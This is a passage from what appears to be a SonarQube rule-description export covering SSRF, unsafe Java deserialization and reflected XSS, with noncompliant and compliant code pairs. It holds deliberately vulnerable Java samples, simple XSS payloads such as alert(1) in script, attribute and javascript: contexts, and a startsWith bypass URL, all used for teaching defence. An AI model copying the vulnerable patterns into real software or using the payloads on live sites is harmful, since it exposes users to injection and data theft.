Java Net Package</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to SSRF as it performs an HTTP request to a URL defined by untrusted data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    String location = req.getParameter(\"url\");\n\n    URL url = new URL(location);\n\n    HttpURLConnection  conn = (HttpURLConnection) url.openConnection();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n    String location = req.getParameter(\"url\");\n\n    List&lt;String&gt; allowedHosts = new ArrayList&lt;String&gt;();\n    allowedHosts.add(\"https://trusted1.example.com/\");\n    allowedHosts.add(\"https://trusted2.example.com/\");\n\n    URL url = new URL(location);\n\n    if (allowedHosts.contains(location))\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-Approved URLs</h4>\n<p>Create a list of authorized and secure URLs that you want the application to be able to request.<br> If a user input does not match an entry in\nthis list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h4>Blacklisting</h4>\n<p>While whitelisting URLs is the preferred approach to ensure only safe URLs are accessible, there are scenarios where blacklisting may be\nnecessary.</p>\n<p>If whitelisting is not feasible, blacklisting can serve as a partial defense against SSRF attacks, particularly when the objective is to block\naccess to internal resources or specific known malicious URLs.</p>\n<p>When implementing blacklisting, it is crucial to:</p>\n<ul>\n  <li> Comprehensively Check URLs: Ensure that the URL scheme, domain, and path are all scrutinized. This prevents attackers from circumventing the\n  blacklist by altering schemes or paths. </li>\n  <li> Understand Limitations: Recognize that blacklisting is not a foolproof solution. It should be part of a multi-layered security strategy to\n  effectively mitigate SSRF risks. </li>\n</ul>\n<p>By adhering to these guidelines, blacklisting can be a useful, albeit secondary, measure in protecting against SSRF attacks.</p>\n<h3>Pitfalls</h3>\n<h4>The trap of 'startsWith' and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>\n<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique\nchanges.</p>\n<p>Thus, a validation like <code>startsWith(\"https://example.com\")</code> or an equivalent with the regex <code>^https://example\\.com.*</code> can be\nexploited with the following URL <code><a href=\"https://example.com.malicous.example.com\">https://example.com.malicous.example.com</a></code>.</p>\n<h4>Blacklist TOCTOU</h4>\n<p>When employing a blacklist to mitigate SSRF attacks, it is essential to guard against Time-Of-Check Time-Of-Use (TOCTOU) vulnerabilities in the\nvalidation logic.</p>\n<p>A common example of a TOCTOU vulnerability occurs when the domain name is resolved to an IP address for blacklist validation, but the hostname is\nresolved again later by the request library to make the actual request. An attacker could exploit DNS rebinding to change the IP address between these\ntwo resolutions and bypass the blacklist.</p>\n<p>To prevent this, ensure that the domain name is resolved to an IP address only once, and this IP address is used consistently throughout the\nvalidation and request process.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/\">Top 10 2021 Category A10 - Server-Side Request\n  Forgery (SSRF)</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/918\">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5144","summary":"Server-side requests should not be vulnerable to forging attacks","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Deserialization injections occur when applications deserialize wholly or partially untrusted data without verification.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application performing unsafe deserialization:<br> After detecting the injection vector, attackers inject a\ncarefully-crafted payload into the application.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Application-specific attacks</h4>\n<p>In this scenario, the attackers succeed in injecting an object of the expected class, but with malicious properties that affect the objectâs\nbehavior.</p>\n<p>If the application relies on the properties of the deserialized object, attackers can modify the data structure or content to escalate privileges\nor perform unwanted actions.<br> In the context of an e-commerce application, this could be changing the number of products or prices.</p>\n<h4>Full application compromise</h4>\n<p>In the worst-case scenario, the attackers succeed in injecting an object of a completely different class than expected, triggering code\nexecution.</p>\n<p>Depending on the attacker, code execution can be used with different intentions:</p>\n<ul>\n  <li> Download the internal serverâs data, most likely to sell it. </li>\n  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>\n  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to\nelevate his privileges as an administrator and attack other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nthrough a combination of unsafe deserialization and misconfiguration:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Java I/O API</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to deserialization attacks because it deserializes HTTP data without validating it first.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class RequestProcessor {\n  protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n    ServletInputStream servletIS = request.getInputStream();\n    ObjectInputStream  objectIS  = new ObjectInputStream(servletIS);\n    Object input                 = objectIS.readObject();\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class SecureObjectInputStream extends ObjectInputStream {\n\n  @Override\n  protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {\n\n    List&lt;String&gt; approvedClasses = new ArrayList&lt;String&gt;();\n    approvedClasses.add(AllowedClass1.class.getName());\n    approvedClasses.add(AllowedClass2.class.getName());\n\n    if (!approvedClasses.contains(osc.getName())) {\n      throw new InvalidClassException(\"Unauthorized deserialization\", osc.getName());\n    }\n\n    return super.resolveClass(osc);\n  }\n}\n\npublic class RequestProcessor {\n  protected void doGet(HttpServletRequest request, HttpServletResponse response) {\n    ServletInputStream servletIS = request.getInputStream();\n    ObjectInputStream  objectIS  = new SecureObjectInputStream(servletIS);\n    Object input                 = objectIS.readObject();\n  }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to provide data for deserialization generally creates more problems than it solves.</p>\n<p>Anything that can be done through deserialization can generally be done with more secure data structures.<br> Therefore, our first suggestion is to\navoid deserialization in the first place.</p>\n<p>However, if deserialization mechanisms are valid in your context, here are some security suggestions.</p>\n<h4>More secure serialization methods</h4>\n<p>Some more secure serialization methods reduce the risk of security breaches, although not definitively.</p>\n<p>A complete object serializer is probably unnecessary if you only need to receive primitive data (for example integers, strings, bools, etc.).<br>\nIn this case, formats such as JSON and XML protect the application from deserialization attacks by default.</p>\n<p>For more complex objects, the next step is to control which class fields are exposed by creating class-specific serialization methods.<br> The most\ncommon method is to use Data Transfer Objects (DTO) patterns or Google Protocol Buffers (protobufs). After creating the Protobuf data structure, the\nProtobuf compiler creates class files that handle operations such as serializing and deserializing data.</p>\n<h4>Integrity check</h4>\n<p>Message authentication codes (MAC) can be used to prevent tampering with serialized data that is meant to be stored outside the application\nserver:</p>\n<ul>\n  <li> On the server-side, when serializing an object, compute a MAC of the result and append it to the serialized object string. </li>\n  <li> When the serialized value is submitted back, verify the serialization string MAC on the server side before deserialization. </li>\n</ul>\n<p>Depending on the situation, two MAC computation modes can be used.</p>\n<p>If the same application will be responsible for the MAC computing and validation, a symmetric signature algorithm can be used. In that case, HMAC\nshould be preferred, with a strong underlying hash algorithm such as SHA-256.</p>\n<p>If multiple parties have to validate the serialized data, an asymetric signature algorithm should be used. This will reduce the chances for a\nsigning secret to be leaked. In that case, the <code>RSASSA-PSS</code> algorithm can be used.</p>\n<p><strong>Note</strong>: Be sure to store the signing secret securely.</p>\n<h4>Pre-Approved classes</h4>\n<p>As a last resort, create a list of approved and safe classes that the application should be able to deserialize.<br> If the untrusted class does\nnot match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Note</strong>: Untrusted classes should be filtered out <strong>during</strong> deserialization, not after.<br> Depending on the language\nor framework, this should be possible by overriding the serialization process or using native capabilities to restrict type deserialization.</p>\n<p>In the previous example, the pre-approved list uses class names to validate the deserialized class.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization\">Top 10 2017 Category A8 - Insecure\n  Deserialization</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/502\">CWE-502 - Deserialization of Untrusted Data</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5135","summary":"Deserialization should not be vulnerable to injection attacks","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Blocker","description":"<p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of\nthe victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back\nto the user.</p>\n<h2>Why is this an issue?</h2>\n<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming\nHTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>\n<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own\nbrowser.</p>\n<p>A user with malicious intent carefully crafts the link beforehand.</p>\n<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code\nthat can be interpreted by the target userâs browser, such as HTML, CSS, or JavaScript.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Vandalism on the front-end website</h4>\n<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and\ntheft of the benevolent userâs data.</p>\n<h4>Identity spoofing</h4>\n<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>\n<h4>Record user activity</h4>\n<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard\nactivity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>\n<h4>Chaining XSS with other vulnerabilities</h4>\n<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br> For\nexample, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code\ninjection vulnerability in the admin control panel of a web application.</p>\n<h2>How to fix it in JSP</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to cross-site scripting because JSP does not auto-escape variables.</p>\n<p>User input embedded in HTML code should be HTML-encoded to prevent the injection of additional code. This can be done with the <a\nhref=\"https://owasp.org/www-project-java-encoder/\">OWASP Java Encoder</a> or similar libraries.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n&lt;%@page contentType=\"text/html\" pageEncoding=\"UTF-8\"%&gt;\n&lt;%@taglib prefix=\"e\" uri=\"https://www.owasp.org/index.php/OWASP_Java_Encoder_Project\" %&gt;\n&lt;!doctype html&gt;\n&lt;html&gt;\n &lt;body&gt;\n  &lt;h1&gt;${param.title}&lt;/h1&gt;    &lt;!-- Noncompliant --&gt;\n &lt;/body&gt;\n&lt;/html&gt;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n&lt;%@page contentType=\"text/html\" pageEncoding=\"UTF-8\"%&gt;\n&lt;%@taglib prefix=\"e\" uri=\"https://www.owasp.org/index.php/OWASP_Java_Encoder_Project\" %&gt;\n&lt;!doctype html&gt;\n&lt;html&gt;\n &lt;body&gt;\n  &lt;h1&gt;${e:forHtml(param.title)}&lt;/h1&gt;\n &lt;/body&gt;\n&lt;/html&gt;\n</pre>\n<h3>How does this work?</h3>\n<p>Template engines are used by web applications to build HTML content. Template files contain static HTML as well as template language instruction.\nThese instructions allow, for example, to insert dynamic values into the document as the template is rendered.</p>\n<h4>Encode data according to the HTML context</h4>\n<p>The best approach to protect against XSS is to systematically encode data that is written to HTML documents. The goal is to leave the data intact\nfrom the end userâs point of view but make it uninterpretable by web browsers.</p>\n<p>XSS exploitation techniques vary depending on the HTML context where malicious input is injected. For each HTML context, there is a specific\nencoding to prevent JavaScript code from being interpreted. The following table summarizes the encoding to apply for each HTML context.</p>\n<table>\n  <colgroup>\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Context</th>\n      <th>Code example</th>\n      <th>Exploit example</th>\n      <th>Encoding</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td> <p>Inbetween tags</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div&gt;\n  { data }\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div&gt;\n  &lt;script&gt;\n    alert(1)\n  &lt;/script&gt;\n&lt;/div&gt;\n</pre></td>\n      <td> <p>HTML entity encoding: replace the following characters by HTML-safe sequences.</p>\n        <ul>\n          <li> &amp; â &amp;amp; </li>\n          <li> &lt; â &amp;lt; </li>\n          <li> &gt; â &amp;gt; </li>\n          <li> \" â &amp;quot; </li>\n          <li> ' â &amp;#x27; </li>\n        </ul> </td>\n    </tr>\n    <tr>\n      <td> <p>In an attribute surrounded with single or double quotes</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=\"{ data }\"&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=\"\"\n     onmouseover=\"alert(1)\"&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td> <p>HTML entity encoding: replace the following characters with HTML-safe sequences.</p>\n        <ul>\n          <li> &amp; â &amp;amp; </li>\n          <li> &lt; â &amp;lt; </li>\n          <li> &gt; â &amp;gt; </li>\n          <li> \" â &amp;quot; </li>\n          <li> ' â &amp;#x27; </li>\n        </ul> </td>\n    </tr>\n    <tr>\n      <td> <p>In an unquoted attribute</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag={ data }&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=foo\n     onmouseover=alert(1)&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully.</p> </td>\n    </tr>\n    <tr>\n      <td> <p>In a URL attribute</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;a href=\"{ data }\"&gt;\n  ...\n&lt;/a&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;a href=\"javascript:alert(1)\"&gt;\n  ...\n&lt;/a&gt;\n</pre></td>\n      <td> <p>Validate the URL by parsing the data. Make sure relative URLs start with a <code>/</code> and that absolute URLs use <code>https</code>\n      as a scheme.</p> </td>\n    </tr>\n    <tr>\n      <td> <p>In a script block</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;script&gt;\n  { data }\n&lt;/script&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;script&gt;\n  alert(1)\n&lt;/script&gt;\n</pre></td>\n      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully. To pass values to a JavaScript context, the recommended way is to use a data attribute:</p>  <pre>\n&lt;!doctype html&gt;\n&lt;script data=\"{ data }\"&gt;\n  ...\n&lt;/script&gt;\n</pre></td>\n    </tr>\n  </tbody>\n</table>\n<p><code>org.owasp.encoder.Encode.forHtml</code> is the recommended method to encode HTML entities.</p>\n<h3>Pitfalls</h3>\n<h4>Content-types</h4>\n<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to\ncross-site scripting vulnerabilities.<br> The following content-types are known to be affected:</p>\n<ul>\n  <li> application/mathml+xml </li>\n  <li> application/rdf+xml </li>\n  <li> application/vnd.wap.xhtml+xml </li>\n  <li> application/xhtml+xml </li>\n  <li> application/xml </li>\n  <li> image/svg+xml </li>\n  <li> multipart/x-mixed-replace </li>\n  <li> text/html </li>\n  <li> text/rdf </li>\n  <li> text/xml </li>\n  <li> text/xsl </li>\n</ul>\n<h4>The limits of validation</h4>\n<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the\nrecommended approach.</p>\n<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is\nsometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the\nfilters.</p>\n<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is\ntrying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,\nin the long run, is very difficult.</p>\n<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of \"javascript:\" URI.</p>\n<h3>Going the extra mile</h3>\n<h4>Content Security Policy (CSP) Header</h4>\n<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to\n<strong>block</strong> loading data that does not meet the applicationâs security requirements. If configured correctly, this can prevent any attempt\nto exploit XSS in the application.<br> <a href=\"https://web.dev/csp-xss/\">Learn more here.</a></p>\n<h2>How to fix it in a Servlet</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to cross-site scripting because it returns an HTML response that contains user input.</p>\n<p>Third-party data, such as user input, is not to be trusted. If embedded in HTML code, it should be HTML-encoded to prevent the injection of\nadditional code. This can be done with the <a href=\"https://owasp.org/www-project-java-encoder/\">OWASP Java Encoder</a> or similar libraries.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\npublic void endpoint(HttpServletRequest request, HttpServletResponse response) throws IOException\n{\n    String data        = request.getParameter(\"input\");\n    PrintWriter writer = response.getWriter();\n\n    writer.print(data);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nimport org.owasp.encoder.Encode;\n\npublic void endpoint(HttpServletRequest request, HttpServletResponse response) throws IOException\n{\n    String data        = request.getParameter(\"input\");\n    PrintWriter writer = response.getWriter();\n\n    writer.print(Encode.forHtml(data));\n}\n</pre>\n<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response with the\ncontent-type header.</p>\n<p>For example, setting the content-type to <code>text/plain</code> with the <code>setContentType</code> function allows to safely reflect user input\nbecause browsers will not try to parse and execute the response.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"12\" data-diff-type=\"noncompliant\">\npublic void endpoint(HttpServletRequest request, HttpServletResponse response) throws IOException\n{\n    String data        = request.getParameter(\"input\");\n    PrintWriter writer = response.getWriter();\n\n    writer.print(data);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"12\" data-diff-type=\"compliant\">\npublic void endpoint(HttpServletRequest request, HttpServletResponse response) throws IOException\n{\n    String data        = request.getParameter(\"input\");\n    PrintWriter writer = response.getWriter();\n\n    response.setContentType(\"text/plain\");\n    writer.print(data);\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Encode data according to the HTML context</h4>\n<p>The best approach to protect against XSS is to systematically encode data that is written to HTML documents. The goal is to leave the data intact\nfrom the end userâs point of view but make it uninterpretable by web browsers.</p>\n<p>XSS exploitation techniques vary depending on the HTML context where malicious input is injected. For each HTML context, there is a specific\nencoding to prevent JavaScript code from being interpreted. The following table summarizes the encoding to apply for each HTML context.</p>\n<table>\n  <colgroup>\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Context</th>\n      <th>Code example</th>\n      <th>Exploit example</th>\n      <th>Encoding</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td> <p>Inbetween tags</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div&gt;\n  { data }\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div&gt;\n  &lt;script&gt;\n    alert(1)\n  &lt;/script&gt;\n&lt;/div&gt;\n</pre></td>\n      <td> <p>HTML entity encoding: replace the following characters by HTML-safe sequences.</p>\n        <ul>\n          <li> &amp; â &amp;amp; </li>\n          <li> &lt; â &amp;lt; </li>\n          <li> &gt; â &amp;gt; </li>\n          <li> \" â &amp;quot; </li>\n          <li> ' â &amp;#x27; </li>\n        </ul> </td>\n    </tr>\n    <tr>\n      <td> <p>In an attribute surrounded with single or double quotes</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=\"{ data }\"&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=\"\"\n     onmouseover=\"alert(1)\"&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td> <p>HTML entity encoding: replace the following characters with HTML-safe sequences.</p>\n        <ul>\n          <li> &amp; â &amp;amp; </li>\n          <li> &lt; â &amp;lt; </li>\n          <li> &gt; â &amp;gt; </li>\n          <li> \" â &amp;quot; </li>\n          <li> ' â &amp;#x27; </li>\n        </ul> </td>\n    </tr>\n    <tr>\n      <td> <p>In an unquoted attribute</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag={ data }&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;div tag=foo\n     onmouseover=alert(1)&gt;\n  ...\n&lt;/div&gt;\n</pre></td>\n      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully.</p> </td>\n    </tr>\n    <tr>\n      <td> <p>In a URL attribute</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;a href=\"{ data }\"&gt;\n  ...\n&lt;/a&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;a href=\"javascript:alert(1)\"&gt;\n  ...\n&lt;/a&gt;\n</pre></td>\n      <td> <p>Validate the URL by parsing the data. Make sure relative URLs start with a <code>/</code> and that absolute URLs use <code>https</code>\n      as a scheme.</p> </td>\n    </tr>\n    <tr>\n      <td> <p>In a script block</p> </td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;script&gt;\n  { data }\n&lt;/script&gt;\n</pre></td>\n      <td><pre>\n&lt;!doctype html&gt;\n&lt;script&gt;\n  alert(1)\n&lt;/script&gt;\n</pre></td>\n      <td> <p><strong>Dangerous context</strong>: HTML output encoding will not prevent XSS fully. To pass values to a JavaScript context, the recommended way is to use a data attribute:</p>  <pre>\n&lt;!doctype html&gt;\n&lt;script data=\"{ data }\"&gt;\n  ...\n&lt;/script&gt;\n</pre></td>\n    </tr>\n  </tbody>\n</table>\n<p><code>org.owasp.encoder.Encode.forHtml</code> is the recommended method to encode HTML entities.</p>\n<h3>Pitfalls</h3>\n<h4>Content-types</h4>\n<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to\ncross-site scripting vulnerabilities.<br> The following content-types are known to be affected:</p>\n<ul>\n  <li> application/mathml+xml </li>\n  <li> application/rdf+xml </li>\n  <li> application/vnd.wap.xhtml+xml </li>\n  <li> application/xhtml+xml </li>\n  <li> application/xml </li>\n  <li> image/svg+xml </li>\n  <li> multipart/x-mixed-replace </li>\n  <li> text/html </li>\n  <li> text/rdf </li>\n  <li> text/xml </li>\n  <li> text/xsl </li>\n</ul>\n<h4>The limits of validation</h4>\n<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the\nrecommended approach.</p>\n<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is\nsometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the\nfilters.</p>\n<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is\ntrying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,\nin the long run, is very difficult.</p>\n<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of \"javascript:\" URI.</p>\n<h3>Going the extra mile</h3>\n<h4>Content Security Policy (CSP) Header</h4>\n<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to\n<strong>block</strong> loading data that does not meet the applicationâs security requirements. If configured correctly, this can prevent any attempt\nto exploit XSS in the application.<br> <a href=\"https://web.dev/csp-xss/\">Learn more here.</a></p>\n<h2>How to fix it in Spring</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to cross-site scripting because it returns an HTML response that contains user input.</p>\n<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response. For\nexample, you can use the <code>produces</code> property of the <code>GetMapping</code> annotation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"noncompliant\">\n@RestController\npublic class ApiController {\n\n    @GetMapping(value = \"/endpoint\")\n    public String endpoint(@RequestParam(\"input\") String input) {\n        return input;\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"compliant\">\n@RestController\npublic class ApiController {\n\n    @GetMapping(value = \"/endpoint\", produces = \"text/plain\")\n    public String endpoint(@RequestParam(\"input\") String input) {\n        return input;\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>If the HTTP response is HTML code, it is highly recommended to use a template engine like <a href=\"https://www.thymeleaf.org/\">Thymeleaf</a> to\ngenerate it. This template engine separates the view from the business logic and automatically encodes the output of variables, drastically reducing\nthe risk of cross-site scripting vulnerabilities.</p>\n<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response with the\n<code>content-type</code> HTTP header. This header tells the browser that the response does not contain HTML code and should not be parsed and\ninterpreted as HTML. Thus, the response is not vulnerable to reflected cross-site scripting.</p>\n<p>For example, setting the content-type to <code>text/plain</code> allows to safely reflect user input since browsers will not try to parse and\nexecute the response.</p>\n<h3>Pitfalls</h3>\n<h4>Content-types</h4>\n<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to\ncross-site scripting vulnerabilities.<br> The following content-types are known to be affected:</p>\n<ul>\n  <li> application/mathml+xml </li>\n  <li> application/rdf+xml </li>\n  <li> application/vnd.wap.xhtml+xml </li>\n  <li> application/xhtml+xml </li>\n  <li> application/xml </li>\n  <li> image/svg+xml </li>\n  <li> multipart/x-mixed-replace </li>\n  <li> text/html </li>\n  <li> text/rdf </li>\n  <li> text/xml </li>\n  <li> text/xsl </li>\n</ul>\n<h4>The limits of validation</h4>\n<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the\nrecommended approach.</p>\n<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is\nsometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the\nfilters.</p>\n<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is\ntrying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,\nin the long run, is very difficult.</p>\n<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of \"javascript:\" URI.</p>\n<h3>Going the extra mile</h3>\n<h4>Content Security Policy (CSP) 